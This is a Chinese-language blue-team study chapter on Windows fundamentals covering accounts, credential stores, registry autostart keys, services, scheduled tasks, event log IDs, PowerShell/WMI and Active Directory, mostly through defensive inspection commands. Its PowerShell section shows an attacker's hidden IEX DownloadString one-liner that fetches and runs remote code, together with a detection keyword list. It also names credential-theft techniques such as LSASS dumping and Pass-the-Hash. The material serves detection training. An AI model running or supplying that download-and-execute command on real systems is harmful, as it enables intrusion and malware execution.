---
title: "Windows 基础"
date: 2026-11-10
draft: false
categories: ["蓝队"]
weight: 3
showTableOfContents: true
---

> 难度：★★☆☆☆ ｜ 重要度：必学 ｜ 建议学时：20 小时 ｜ 前置：[计算机组成与操作系统基础](01-计算机组成与操作系统基础.md)

## 1. 为什么蓝队要学 Windows

- 绝大多数企业终端与大量服务器是 Windows。
- Windows 事件日志是蓝队最重要的数据源之一。
- 域环境（Active Directory）是企业内网的核心，也是横向移动的主战场。
- 常见恶意软件、勒索、钓鱼攻击主要针对 Windows。

> 目标：能独立查看账号、服务、启动项、计划任务、事件日志，能理解域环境基础，能发现常见异常。

---

## 2. 版本与体系结构

### 2.1 常见版本

| 版本 | 场景 |
|---|---|
| Windows 10/11 专业版/企业版 | 办公终端 |
| Windows Server 2016/2019/2022/2025 | 服务器 |
| Windows Server Core | 无图形界面服务器 |
| Windows LTSC | 长期支持版，功能精简 |

### 2.2 核心组件

- `ntoskrnl.exe`：内核
- `smss.exe`：会话管理器
- `csrss.exe`：客户端/服务器运行时
- `wininit.exe`：初始化
- `services.exe`：服务控制管理器
- `lsass.exe`：本地安全认证，处理登录与凭据
- `svchost.exe`：服务宿主
- `explorer.exe`：桌面外壳

**蓝队意义**：这些系统进程的异常行为（被注入、伪造、异常子进程）是高危信号。

---

## 3. 用户、组与认证

### 3.1 本地用户与组

```powershell
net user
net user administrator
net localgroup
net localgroup administrators
whoami
whoami /all
whoami /priv
```

常用内置组：

| 组 | 权限 |
|---|---|
| Administrators | 管理员 |
| Remote Desktop Users | 远程桌面登录 |
| Backup Operators | 备份/还原，可绕过部分权限 |
| Power Users | 旧版兼容组 |
| Users | 普通用户 |
| Guests | 来宾 |

### 3.2 凭据存储

- SAM 数据库：`C:\Windows\System32\config\SAM`
- LSASS 进程内存：缓存凭据、哈希、票据
- DPAPI：用户数据保护
- Credential Manager：凭据管理器

**攻击视角**：

- 抓取 SAM 中的 NTLM 哈希
- 从 LSASS 内存提取明文/哈希（如 Mimikatz）
- Kerberoasting、AS-REP Roasting
- 凭据复用与哈希传递（Pass-the-Hash）

**蓝队视角**：

- 监控 LSASS 访问（Sysmon 10）
- 监控 4624 登录类型、4648 显式凭据
- 监控 4768/4769 Kerberos 异常
- 关注管理员账号异常登录

### 3.3 UAC

用户账户控制（UAC）在管理员执行特权操作时提示确认。

- 提权（Elevation）：普通管理员令牌 → 高完整性令牌
- 绕过 UAC 是常见提权手法（如 `fodhelper`、`computerdefaults`）

**检测**：Sysmon 1 中 `fodhelper.exe`、`sdclt.exe` 等异常启动；注册表劫持。

---

## 4. NTFS 与文件系统

### 4.1 关键目录

| 路径 | 作用 |
|---|---|
| `C:\Windows\System32` | 系统核心文件 |
| `C:\Windows\SysWOW64` | 32 位兼容 |
| `C:\Windows\Temp` | 系统临时目录 |
| `C:\Users\<user>\AppData\Local\Temp` | 用户临时目录 |
| `C:\ProgramData` | 全局应用数据 |
| `C:\Windows\Tasks` | 旧版计划任务 |
| `C:\Windows\System32\Tasks` | 计划任务定义 |
| `C:\Windows\System32\drivers` | 驱动 |
| `C:\Windows\System32\config` | 注册表与 SAM |
| `C:\inetpub\wwwroot` | IIS 默认网站 |
| `C:\Windows\Panther` | 安装日志 |
| `C:\Windows\Prefetch` | 预读取（执行痕迹） |
| `C:\$Recycle.Bin` | 回收站 |

### 4.2 文件属性

- 只读、隐藏、系统、存档
- 备用数据流（ADS）：`file.txt:secret`
- 文件哈希
- 数字签名
- Zone.Identifier：标记下载来源

**排查命令**：

```powershell
Get-Item file.exe | Format-List *
Get-ChildItem -Force
Get-ChildItem -Recurse -File | Get-Item -Stream *
Get-AuthenticodeSignature file.exe
Get-FileHash file.exe -Algorithm SHA256
```

### 4.3 时间戳

- 创建时间（CreationTime）
- 修改时间（LastWriteTime）
- 访问时间（LastAccessTime）
- MFT 修改时间（需专门工具）

攻击者可修改时间戳（Timestomping）混淆时间线。

---

## 5. 注册表

### 5.1 根键

| 根键 | 内容 |
|---|---|
| `HKEY_LOCAL_MACHINE` (HKLM) | 系统级配置 |
| `HKEY_CURRENT_USER` (HKCU) | 当前用户配置 |
| `HKEY_USERS` (HKU) | 所有用户配置 |
| `HKEY_CLASSES_ROOT` (HKCR) | 文件关联/COM |
| `HKEY_CURRENT_CONFIG` (HKCC) | 当前硬件配置 |

### 5.2 常见自启动位置

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\System\CurrentControlSet\Services
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### 5.3 排查命令

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ChildItem "HKLM:\System\CurrentControlSet\Services" |
  Where-Object {$_.GetValue("ImagePath") -match "temp|Users|ProgramData"}
```

> 注册表是持久化的重灾区：Run、Services、Winlogon、IFEO、COM 劫持、WMI、浏览器扩展等。

---

## 6. 服务与驱动

### 6.1 服务管理

```powershell
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
sc query
sc qc <service>
Get-CimInstance Win32_Service | Select Name,State,StartName,PathName
```

关键点：

- `StartName`：服务运行账号（LocalSystem 权限最高）
- `PathName`：服务可执行文件路径
- 服务失败恢复配置
- 服务签名

### 6.2 异常服务特征

- 路径在 `C:\Users\Public`、`C:\ProgramData`、`C:\Temp`
- 路径含空格与引号问题（unquoted service path）
- 无数字签名
- 名称伪装为系统服务
- 服务描述为空或乱码
- 创建时间与系统更新不一致

### 6.3 驱动

- 内核驱动运行在 Ring 0
- 驱动签名强制（DSE）
- 易受攻击驱动（BYOVD）可被用于关闭 EDR

**检测**：Sysmon 6 驱动加载、签名验证、异常驱动路径。

---

## 7. 进程与工具

### 7.1 任务管理器与资源监视器

- 进程、CPU、内存、磁盘、网络
- 启动项
- 用户会话
- 服务

### 7.2 Sysinternals

| 工具 | 用途 |
|---|---|
| Process Explorer | 进程树、命令行、签名、加载模块、句柄 |
| Process Monitor (Procmon) | 文件/注册表/网络/进程监控 |
| Autoruns | 全部启动项与持久化 |
| TCPView | 网络连接 |
| PsExec | 远程执行（也可被攻击者滥用） |
| Sysmon | 系统监控与日志 |

### 7.3 关键排查命令

```powershell
Get-Process | Sort-Object CPU -Descending | Select -First 20
Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine
Get-NetTCPConnection | Sort-Object State
Get-NetTCPConnection -State Listen
tasklist /v
taskkill /PID <pid> /F
# WMIC 在 Win11 24H2+ 默认不再提供，统一使用上面的 Get-CimInstance
```

---

## 8. 计划任务与启动项

### 8.1 计划任务

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask
Get-ScheduledTaskInfo -TaskName <name>
```

重点：

- 任务动作（执行的程序与参数）
- 触发器（登录、启动、定时）
- 运行账号
- 任务文件：`C:\Windows\System32\Tasks`

### 8.2 启动项

```powershell
Get-CimInstance Win32_StartupCommand
msconfig
explorer shell:startup
explorer shell:common startup
```

Autoruns 能覆盖：

- 登录启动项
- 服务
- 驱动
- 计划任务
- WMI
- 浏览器插件
- 已知 DLL

---

## 9. 事件日志

### 9.1 日志分类

| 日志 | 内容 |
|---|---|
| Security | 登录、账号、权限、审核 |
| System | 系统组件、服务、驱动 |
| Application | 应用事件 |
| Setup | 安装 |
| ForwardedEvents | 转发日志 |

### 9.2 查看方式

```powershell
eventvwr.msc
Get-WinEvent -LogName Security -MaxEvents 50
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 10
wevtutil qe Security /c:10 /f:text
```

### 9.3 高频事件 ID

| ID | 含义 |
|---|---|
| 4624 | 登录成功 |
| 4625 | 登录失败 |
| 4634 | 注销 |
| 4648 | 显式凭据登录 |
| 4672 | 授予特殊权限 |
| 4688 | 进程创建 |
| 4689 | 进程退出 |
| 4697 | 服务安装（Security） |
| 4698 | 计划任务创建 |
| 4699 | 计划任务删除 |
| 4702 | 计划任务修改 |
| 4720 | 创建用户 |
| 4722 | 启用用户 |
| 4724 | 重置密码 |
| 4725 | 禁用用户 |
| 4726 | 删除用户 |
| 4728 | 加入全局组 |
| 4732 | 加入本地组 |
| 4756 | 加入通用组 |
| 4768 | 请求 TGT |
| 4769 | 请求服务票据 |
| 4771 | Kerberos 预认证失败 |
| 4776 | NTLM 凭据验证 |
| 7045 | 服务安装（System） |
| 1102 | 安全日志被清除 |
| 104 | 系统日志被清除 |
| 4104 | PowerShell 脚本块 |

> 详细分析见 [Windows 日志分析](../06-主机与终端安全/02-Windows日志分析.md)。

### 9.4 登录类型

| 类型 | 含义 |
|---|---|
| 2 | 交互式登录（本地键盘） |
| 3 | 网络登录（共享访问） |
| 4 | 批处理登录 |
| 5 | 服务登录 |
| 7 | 解锁 |
| 8 | 网络明文登录 |
| 9 | 新凭据 |
| 10 | 远程桌面 |
| 11 | 缓存凭据 |

---

## 10. PowerShell 与 WMI

### 10.1 PowerShell 基础

```powershell
Get-Help Get-Process
Get-Command *service*
Get-Process | Where-Object {$_.CPU -gt 100}
Get-Service | Select Name,Status
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue
```

### 10.2 PowerShell 日志

- 脚本块日志：事件 4104
- 模块日志：事件 4103
- 转录日志：文件记录
- 引擎启动：400/403
- AMSI 检测

**攻击者常用**：

```powershell
powershell -enc <base64>
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"
```

**检测**：命令行含 `-enc`、`-nop`、`-w hidden`、`IEX`、`DownloadString`、`FromBase64String`。

### 10.3 WMI

```powershell
Get-CimInstance Win32_Process
Get-CimInstance Win32_OperatingSystem
# WMIC 在 Win11 24H2+ 默认不再提供；Get-WmiObject 仅 Windows PowerShell 5.1 可用
```

WMI 可被用于：

- 查询系统信息（发现）
- 远程执行（横向移动）
- 事件订阅持久化（`__EventFilter`、`CommandLineEventConsumer`）

**检测**：Sysmon 19/20/21、WMI 活动日志、异常 `wmiprvse.exe` 子进程。

---

## 11. 域与 Active Directory 基础

### 11.1 核心概念

| 概念 | 说明 |
|---|---|
| DC（域控制器） | 提供认证与目录服务 |
| AD DS | Active Directory 域服务 |
| OU | 组织单位 |
| GPO | 组策略 |
| LDAP | 目录访问协议 |
| Kerberos | 域认证协议 |
| SMB | 文件共享协议 |
| DNS | 域内定位 DC |

### 11.2 认证流程（简化）

```text
用户登录 → 向 DC 请求 TGT（AS-REQ/AS-REP）
→ 使用 TGT 请求服务票据（TGS-REQ/TGS-REP）
→ 用服务票据访问资源
```

相关事件：

- 4768：TGT 请求
- 4769：服务票据请求
- 4771：预认证失败
- 4776：NTLM 验证

### 11.3 常见域攻击

- 口令喷洒/爆破
- Kerberoasting：请求服务票据并离线破解
- AS-REP Roasting：对禁用预认证的账号获取哈希
- DCSync：模拟 DC 同步获取凭据
- Golden Ticket / Silver Ticket
- Zerologon、PrintNightmare 等漏洞
- 委派滥用

**蓝队重点**：监控异常票据请求、特权组变更、DC 访问、异常复制权限。

---

## 12. 网络命令

```powershell
ipconfig /all
ipconfig /flushdns
nslookup example.com
ping example.com
tracert example.com
netstat -ano
Get-NetTCPConnection
Test-NetConnection example.com -Port 443
route print
arp -a
```

---

## 13. Windows 排查清单

1. 账号：新增账号、管理员组、密码策略、登录记录
2. 进程：异常进程、父进程、命令行、签名、路径
3. 网络：监听端口、外联连接、DNS 缓存
4. 服务：新增服务、路径、运行账号、签名
5. 启动项：Run、Startup、Autoruns 全量
6. 计划任务：新增/修改任务、执行命令
7. 注册表：Run、Services、Winlogon、IFEO、COM
8. 日志：4624/4625/4688/4698/7045/1102
9. 文件：Temp、ProgramData、Public、下载目录、最近文件
10. 浏览器：扩展、下载、历史
11. 域：Kerberos 异常、特权组、GPO 变更
12. 样本：可疑二进制、脚本、Office 宏

---

## 14. 动手练习

1. 用 `whoami /all` 查看当前用户权限。
2. 用 Process Explorer 查看 `explorer.exe` 的父进程、命令行、签名。
3. 用 Autoruns 导出启动项并找出非 Microsoft 项。
4. 创建一个计划任务，观察 4698 事件。
5. 创建一个本地用户并加入管理员组，观察 4720/4732。
6. 用 PowerShell 查询最近 10 条 4625 登录失败。
7. 安装 Sysmon，观察进程创建与网络连接事件。
8. 在虚拟机搭建一个最简单的 AD 域（可选）。

---

## 15. 常见误区

- 只看任务管理器，不看命令行与签名。
- 认为进程名正常就没问题（可伪装）。
- 忽略计划任务与服务。
- 不开启审核策略，导致没有日志可查。
- 认为 Windows Defender 能挡住一切。
- 分不清本地账号与域账号。

---

## 16. 自测

1. `lsass.exe` 的作用是什么？为什么它是攻击目标？
2. 4624 登录类型 2、3、10 分别代表什么？
3. 如何查找所有自启动项？
4. 服务路径异常通常有哪些特征？
5. UAC 是什么？常见绕过思路有哪些？
6. 域认证中 TGT 与 TGS 有什么区别？
7. 如何判断一个进程是否可疑？

---

## 17. 延伸阅读

- [Microsoft Learn：Windows 文档](https://learn.microsoft.com/en-us/windows/)
- [Microsoft Learn：安全审核事件](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings)
- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
- [Active Directory 文档](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-domain-services)
- [MITRE ATT&CK：Windows](https://attack.mitre.org/matrices/enterprise/windows/)
- [LOLBAS](https://lolbas-project.github.io/) —— 理解系统二进制滥用

---

## 18. 下一步

- [计算机网络基础](04-计算机网络基础.md)
- [PowerShell 脚本基础](../03-编程与工具/02-PowerShell脚本基础.md)
- [Windows 日志分析](../06-主机与终端安全/02-Windows日志分析.md)
